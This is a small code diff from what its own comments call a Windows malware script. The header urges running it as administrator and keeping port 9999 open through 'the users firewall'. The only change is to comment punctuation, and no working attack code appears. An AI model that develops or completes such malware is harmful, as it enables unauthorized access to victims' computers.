@@ -1,6 +1,6 @@
 # MADE FOR WINDOWS | MALWARE, USE RESPONSIBLY!
 # PLEASE EXECUTE THIS CODE WITH ADMINISTRATOR!
-# MAKE SURE TO CHECK PORT: 9999 DOESN'T GET BLOCKED BY THE USERS FIREWALL!
+# MAKE SURE TO CHECK PORT "9999" DOESN'T GET BLOCKED BY THE USERS FIREWALL!
 import os 
 from os import system 
 # os.system('pip install tkinter') | install `tkinter`, but its a built-in Python module. it doesn't need to be installed using `pip`. In fact, trying to install it using `pip` will likely fail. But its here just incase
